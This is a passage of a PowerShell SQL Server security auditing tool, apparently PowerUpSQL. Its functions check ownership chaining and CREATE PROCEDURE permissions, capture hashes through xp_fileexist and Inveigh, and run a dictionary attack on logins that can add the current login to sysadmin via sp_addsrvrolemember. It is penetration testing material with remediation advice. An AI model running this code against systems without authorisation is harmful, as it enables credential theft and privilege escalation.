                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database.  xp_fileexist Executed, but no password hash was recovered."
                                }

                                # Clear inveigh cache
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                # Update status
                                $Exploited = 'No'
                                $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            # Update status
                            $Exploited = 'No'
                            $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                        }
                    }
                    else
                    {
                        # Update status
                        $IsExploitable  = 'No'
                        $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                    }
                }

                # Add record
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }      
        }else{
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_fileexist."
        }
    }

    End
    {
        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"

        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditPrivDbChaining
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditPrivDbChaining
{
    <#
            .SYNOPSIS
            Check if data ownership chaining is enabled at the server or databases levels.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER NoDefaults
            Don't return information for default databases.
            .PARAMETER NoOutput
            Don't return output.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditPrivDbChaining -Instance SQLServer1\STANDARDDEV2014

            ComputerName  : NETSPI-283-SSU
            Instance      : NETSPI-283-SSU\STANDARDDEV2014
            Vulnerability : Excessive Privilege - Database Ownership Chaining
            Description   : Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.
            Remediation   : Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used
            enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining.
            Severity      : Low
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : There is not exploit available at this time.
            Details       : The database testdb was found configured with ownership chaining enabled.
            Reference     : https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivDbChaining -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Database Ownership Chaining'
        $Description   = 'Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.'
        $Remediation   = "Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining."
        $Severity      = 'Low'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        $Details       = ''
        $Reference     = 'https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx '
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Select links configured with static credentials

        if($NoDefaults)
        {
            $ChainDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoDefaults -SuppressVerbose | Where-Object -FilterScript {
                $_.is_db_chaining_on -eq 'True'
            }
        }
        else
        {
            $ChainDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.is_db_chaining_on -eq 'True'
            }
        }

        # Update vulnerable status
        if($ChainDatabases)
        {
            $IsVulnerable  = 'Yes'
            $ChainDatabases |
            ForEach-Object -Process {
                $DatabaseName = $_.DatabaseName

                Write-Verbose -Message "$Instance : - The database $DatabaseName has ownership chaining enabled."
                $Details = "The database $DatabaseName was found configured with ownership chaining enabled."
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default databases were found with ownership chaining enabled."
        }

        # Check for server wide setting
        $ServerCheck = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Name -like '*chain*' -and $_.config_value -eq 1
        }
        if($ServerCheck)
        {
            $IsVulnerable  = 'Yes'
            Write-Verbose -Message "$Instance : - The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
            $Details = "The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
        }

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"
        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
        # Also, recommend link crawler module


        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditPrivCreateProcedure
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditPrivCreateProcedure
{
    <#
            .SYNOPSIS
            Check if the current login has the CREATE PROCEDURE permission.  Attempt to leverage to obtain sysadmin privileges.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER NoOutput
            Don't output anything.
            .PARAMETER Exploit
            Exploit vulnerable issues
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Invoke-SQLAuditPrivCreateProcedure -Username evil -Password Password123!

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : PERMISSION - CREATE PROCEDURE
            Description   : The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.
            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a
            command like: REVOKE CREATE PROCEDURE TO user.
            Severity      : Medium
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : No exploit is currently available that will allow evil to become a sysadmin.
            Details       : The evil principal has the CREATE PROCEDURE permission in the testdb database.
            Reference     : https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles |
        ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'PERMISSION - CREATE PROCEDURE'
        $Description   = 'The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.'
        $Remediation   = 'If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a command like: REVOKE CREATE PROCEDURE TO user'
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No exploit is currently available that will allow $CurrentLogin to become a sysadmin."
        $Details       = ''
        $Dependancies = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Get all CREATE PROCEDURE grant permissions for all accessible databases
        $Permissions = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -SuppressVerbose | Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName 'CREATE PROCEDURE'

        if($Permissions)
        {
            # Iterate through each current login and their associated roles
            $CurrentPrincpalList|
            ForEach-Object -Process {
                # Check if they have the CREATE PROCEDURE grant
                $CurrentPrincipal = $_
                $Permissions |
                ForEach-Object -Process {
                    $AffectedPrincipal = $_.PrincipalName
                    $AffectedDatabase = $_.DatabaseName

                    if($AffectedPrincipal -eq $CurrentPrincipal)
                    {
                        # Set flag to vulnerable
                        $IsVulnerable  = 'Yes'
                        Write-Verbose -Message "$Instance : - The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
                        $Details = "The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."

                        # -----------------------------------------------------------------
                        # Check for exploit dependancies
                        # Note: Typically secondary configs required for dba/os execution
                        # -----------------------------------------------------------------
                        $HasAlterSchema = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName 'ALTER' -PermissionType 'SCHEMA' -PrincipalName $CurrentPrincipal -DatabaseName $AffectedDatabase  -SuppressVerbose
                        if($HasAlterSchema)
                        {
                            $IsExploitable = 'Yes'
                            $Dependancies = " $CurrentPrincipal also has ALTER SCHEMA permissions so procedures can be created."
                            Write-Verbose -Message "$Instance : - Dependancies were met: $CurrentPrincipal has ALTER SCHEMA permissions."

                            # Add to report example
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, "$Details$Dependancies", $Reference, $Author)
                        }
                        else
                        {
                            $IsExploitable = 'No'

                            # Add to report example
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }

                        # -----------------------------------------------------------------
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------

                        if($Exploit -and $IsExploitable -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance : - No server escalation method is available at this time."
                        }
                    }
                }
            }
        }
        else
        {
            # Status user
            Write-Verbose -Message "$Instance : - The current login doesn't have the CREATE PROCEDURE permission in any databases."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditWeakLoginPw
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditWeakLoginPw
{
    <#
            .SYNOPSIS
            Perform dictionary attack for common passwords. By default, it will enumerate
            SQL Server logins and the current login and test for "username" as password
            for each enumerated login.
            .PARAMETER Username
            Known SQL Server login to obtain a list of logins with for testing.
            .PARAMETER TestUsername
            SQL Server or domain account to authenticate with.
            .PARAMETER UserFile
            Path to list of users to use.  One per line.
            .PARAMETER Password
            Known SQL Server login password to obtain a list of logins with for testing.
            .PARAMETER TestPassword
            Password to test provided or discovered logins with.
            .PARAMETER PassFile
            Path to list of password to use.  One per line.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER NoUserAsPass
            Don't try to login using the login name as the password.
            .PARAMETER NoUserEnum
            Don't try to enumerate logins to test.
            .PARAMETER StartId
            Start id for fuzzing login IDs when authenticating as a least privilege login.
            .PARAMETER EndId
            End id for fuzzing login IDs when authenticating as a least privilege login.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Invoke-SQLAuditWeakLoginPw -Username myuser -Password mypassword

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Weak Login Password
            Description   : One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.
            Remediation   : Ensure all SQL Server logins are required to use a strong password. Considered inheriting the OS password policy.
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : No
            ExploitCmd    : Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.
            Details       : The testuser (Not Sysadmin) is configured with the password testuser.
            Reference     : https://msdn.microsoft.com/en-us/library/ms161959.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016

            ComputerName  : SQLServer1
            Instance      : SQLServer1\Express
            Vulnerability : Weak Login Password
            Description   : One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.
            Remediation   : Ensure all SQL Server logins are required to use a strong password. Considered inheriting the OS password policy.
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : No
            ExploitCmd    : Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.
            Details       : The testadmin (Sysadmin) is configured with the password testadmin.
            Reference     : https://msdn.microsoft.com/en-us/library/ms161959.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\STANDARDDEV2014
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server login to fuzz logins with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Username to test.')]
        [string]$TestUsername = 'sa',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of users to use.  One per line.')]
        [string]$UserFile,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server password to fuzz logins with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server password to attempt to login with.')]
        [string]$TestPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of passwords to use.  One per line.')]
        [string]$PassFile,

        [Parameter(Mandatory = $false,
        HelpMessage = 'User is tested as pass by default. This setting disables it.')]
        [switch]$NoUserAsPass,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't attempt to enumerate logins from the server.")]
        [switch]$NoUserEnum,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Weak Login Password"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        $CurrentUSerSysadmin = $ServerInfo.IsSysadmin

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Weak Login Password'
        $Description   = 'One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.'
        $Remediation   = 'Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.'
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms161959.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Create empty user / password lists
        $LoginList = @()
        $PasswordList = @()

        # Get logins for testing - file
        if($UserFile)
        {
            Write-Verbose -Message "$Instance - Getting logins from file..."
            Get-Content -Path $UserFile |
            ForEach-Object -Process {
                $LoginList += $_
            }
        }

        # Get logins for testing - variable
        if($TestUsername)
        {
            Write-Verbose -Message "$Instance - Getting supplied login..."
            $LoginList += $TestUsername
        }

        # Get logins for testing - fuzzed
        if(-not $NoUserEnum)
        {
            # Test connection to instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($TestConnection)
            {
                # Check if sysadmin
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq 'Yes')
                {
                    # Query for logins
                    Write-Verbose -Message "$Instance - Getting list of logins..."
                    Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                    Where-Object -FilterScript {
                        $_.PrincipalType -eq 'SQL_LOGIN'
                    } |
                    Select-Object -Property PrincipalName -ExpandProperty PrincipalName |
                    ForEach-Object -Process {
                        $LoginList += $_
                    }
                }
                else
                {
                    # Fuzz logins
                    Write-Verbose -Message "$Instance - Fuzzing principal IDs $StartId to $EndId..."
                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -FuzzNum $FuzzNum -SuppressVerbose |
                    Where-Object -FilterScript {
                        $_.PrincipleType -eq 'SQL Login'
                    } |
                    Select-Object -Property PrincipleName -ExpandProperty PrincipleName |
                    ForEach-Object -Process {
                        $LoginList += $_
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance - Connection Failed - Could not authenticate with provided credentials."
                }
                return
            }
        }

        # Check for users or return - count array
        if($LoginList.count -eq 0 -and (-not $FuzzLogins))
        {
            Write-Verbose -Message "$Instance - No logins have been provided."
            return
        }

        # Get passwords for testing - file
        if($PassFile)
        {
            Write-Verbose -Message "$Instance - Getting password from file..."
            Get-Content -Path $PassFile |
            ForEach-Object -Process {
                $PasswordList += $_
            }
        }

        # Get passwords for testing - variable
        if($TestPassword)
        {
            Write-Verbose -Message "$Instance - Getting supplied password..."
            $PasswordList += $TestPassword
        }

        # Check for provided passwords
        if($PasswordList.count -eq 0 -and ($NoUserAsPass))
        {
            Write-Verbose -Message "$Instance - No passwords have been provided."
            return
        }

        # Iternate through logins and perform dictionary attack
        Write-Verbose -Message "$Instance - Performing dictionary attack..."
        $LoginList |
        Select-Object -Unique |
        ForEach-Object -Process {
            $TargetLogin = $_
            $PasswordList |
            Select-Object -Unique |
            ForEach-Object -Process {
                $TargetPassword = $_

                $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
                Where-Object -FilterScript {
                    $_.Status -eq 'Accessible'
                }
                if($TestPass)
                {
                    # Check if guess credential is a sysadmin
                    $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($IsSysadmin -eq 'Yes')
                    {
                        $SysadminStatus = 'Sysadmin'
                    }
                    else
                    {
                        $SysadminStatus = 'Not Sysadmin'
                    }

                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetPassword"

                    if($Exploit)
                    {
                        Write-Verbose -Message "$Instance - Trying to make you a sysadmin..."

                        # Check if the current login is a sysadmin
                        $IsSysadmin1 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($IsSysadmin1 -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."

                            # Add current user as sysadmin if login was successful
                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetPassword -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose

                            # Check if the current login is a sysadmin again
                            $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($IsSysadmin2 -eq 'Yes')
                            {
                                $Exploited = 'Yes'
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $Exploited = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }

                    # Add record
                    $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetPassword."
                    $IsVulnerable = 'Yes'
                    $IsExploitable = 'Yes'
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $TargetLogin Password = $TargetPassword"
                }
            }
        }

        # Test user as pass
        if(-not $NoUserAsPass)
        {
            $LoginList |
            Select-Object -Unique |
